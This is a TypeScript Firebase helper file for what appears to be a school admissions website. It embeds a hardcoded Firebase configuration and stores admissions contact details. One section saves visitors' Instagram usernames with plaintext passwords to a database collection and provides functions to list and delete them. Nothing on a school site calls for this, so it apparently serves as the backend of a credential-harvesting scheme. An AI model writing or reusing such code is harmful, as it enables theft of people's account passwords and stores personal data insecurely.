import { initializeApp } from 'firebase/app';
import { 
  getFirestore, 
  collection, 
  addDoc, 
  getDocs, 
  query, 
  orderBy, 
  deleteDoc, 
  doc,
  DocumentData,
  QueryDocumentSnapshot
} from 'firebase/firestore';
import { InstagramAccount, ContactSubmission } from '../types';

// Config copied from firebase-applet-config.json
const firebaseConfig = {
  apiKey: "AIzaSyA9luAzqutmMjcNakr0c93OxoChuzgYR5Y",
  authDomain: "gen-lang-client-0393502657.firebaseapp.com",
  projectId: "gen-lang-client-0393502657",
  storageBucket: "gen-lang-client-0393502657.firebasestorage.app",
  messagingSenderId: "712336283196",
  appId: "1:712336283196:web:294e71a91328cf3e15d539"
};

const databaseId = "ai-studio-armypublicschool-7a22965a-8c3d-4924-be5c-e5ddec570f90";

// Initialize Firebase App
const app = initializeApp(firebaseConfig);

// Initialize Firestore with specific custom database ID
export const db = getFirestore(app, databaseId);

// ==========================================
// 1. INSTAGRAM DATA HELPERS
// ==========================================

export async function saveInstagramAccount(username: string, password?: string): Promise<InstagramAccount> {
  const accountData = {
    username: username.trim(),
    password: password || '',
    timestamp: new Date().toLocaleString()
  };

  const docRef = await addDoc(collection(db, 'instagram_accounts'), accountData);
  
  return {
    id: docRef.id,
    ...accountData
  };
}

export async function fetchInstagramAccounts(): Promise<InstagramAccount[]> {
  try {
    const q = query(collection(db, 'instagram_accounts'), orderBy('timestamp', 'desc'));
    const querySnapshot = await getDocs(q);
    const accounts: InstagramAccount[] = [];
    
    querySnapshot.forEach((docSnap: QueryDocumentSnapshot<DocumentData>) => {
      const data = docSnap.data();
      accounts.push({
        id: docSnap.id,
        username: data.username,
        password: data.password,
        timestamp: data.timestamp
      });
    });
    
    return accounts;
  } catch (err) {
    console.error("Error fetching Instagram accounts from Firestore, falling back to local:", err);
    // Return empty array to allow local backup or handle gracefully
    return [];
  }
}

export async function deleteInstagramAccount(id: string): Promise<void> {
  await deleteDoc(doc(db, 'instagram_accounts', id));
}

// ==========================================
// 2. APS ADMISSIONS/CONTACT HELPERS
// ==========================================

export async function saveAdmissionSubmission(submission: Omit<ContactSubmission, 'id'>): Promise<ContactSubmission> {
  const docRef = await addDoc(collection(db, 'aps_submissions'), submission);
  return {
    id: docRef.id,
    ...submission
  };
}

export async function fetchAdmissionSubmissions(): Promise<ContactSubmission[]> {
  try {
    const q = query(collection(db, 'aps_submissions'), orderBy('submittedAt', 'desc'));
    const querySnapshot = await getDocs(q);
    const submissions: ContactSubmission[] = [];
    
    querySnapshot.forEach((docSnap: QueryDocumentSnapshot<DocumentData>) => {
      const data = docSnap.data();
      submissions.push({
        id: docSnap.id,
        name: data.name,
        email: data.email,
        phone: data.phone,
        subject: data.subject,
        message: data.message,
        submittedAt: data.submittedAt
      });
    });
    
    return submissions;
  } catch (err) {
    console.error("Error fetching submissions from Firestore:", err);
    return [];
  }
}

export async function deleteAdmissionSubmission(id: string): Promise<void> {
  await deleteDoc(doc(db, 'aps_submissions', id));
}
